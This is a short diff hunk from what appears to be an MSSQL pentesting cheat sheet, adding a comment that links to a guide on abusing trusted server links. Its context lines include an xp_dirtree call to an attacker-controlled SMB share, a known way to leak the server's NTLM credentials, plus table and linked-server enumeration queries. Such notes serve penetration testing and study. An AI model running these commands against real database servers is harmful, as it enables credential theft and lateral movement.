@@ -41,6 +41,7 @@ exec master.dbo.xp_dirtree '\\attackerIP\share'
 
 SELECT * FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES;
 
+#abusing trusted links - see https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
 #list all servers
 select srvname, isremote from sysservers;
 
